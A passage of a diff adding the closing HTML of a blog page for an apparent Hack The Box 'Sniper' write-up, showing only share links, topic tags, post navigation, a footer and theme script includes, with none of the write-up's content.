+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.com/sniper/" data-title="Sniper" data-via="gr4n173" data-hashtags="windows,htb,smb,.chm,powershell,nc.exe,webshell,nishang"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.com/sniper/" data-hashtag="windows"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.com/sniper/" data-title="Sniper"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.com/sniper/" data-title="Sniper"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.com/sniper/" data-title="Sniper"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/windows/">windows</a>,&nbsp;<a href="/tags/htb/">htb</a>,&nbsp;<a href="/tags/smb/">smb</a>,&nbsp;<a href="/tags/.chm/">.chm</a>,&nbsp;<a href="/tags/powershell/">powershell</a>,&nbsp;<a href="/tags/nc.exe/">nc.exe</a>,&nbsp;<a href="/tags/webshell/">webshell</a>,&nbsp;<a href="/tags/nishang/">nishang</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/oauth2/" class="prev" rel="prev" title="OAuth 2"><i class="fas fa-angle-left fa-fw"></i>OAuth 2</a>
+            <a href="/virseccon/" class="next" rel="next" title="VirSecCon2020">VirSecCon2020<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Lots of Love</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">gr4n173</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"gr4n173","id-2":"gr4n173"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
